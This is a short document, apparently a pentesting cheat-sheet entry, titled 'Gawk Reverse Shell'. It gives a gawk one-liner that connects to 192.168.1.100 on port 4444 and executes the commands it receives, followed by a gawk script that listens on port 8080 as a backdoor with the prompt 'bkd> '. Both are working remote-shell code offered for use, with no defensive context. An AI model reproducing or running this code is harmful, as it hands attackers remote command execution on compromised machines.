#Gawk Reverse Shell  
Gawk one liner rev shell by @dmfroberson:  
gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'  
#  
#!/usr/bin/gawk -f  
BEGIN {  
        Port    =       8080  
        Prompt  =       "bkd> "  
  
        Service = "/inet/tcp/" Port "/0/0"  
        while (1) {  
                do {  
                        printf Prompt |& Service  
                        Service |& getline cmd  
                        if (cmd) {  
                                while ((cmd |& getline) > 0)  
                                        print $0 |& Service  
                                close(cmd)  
                        }  
                } while (cmd != "exit")  
                close(Service)  
        }  
}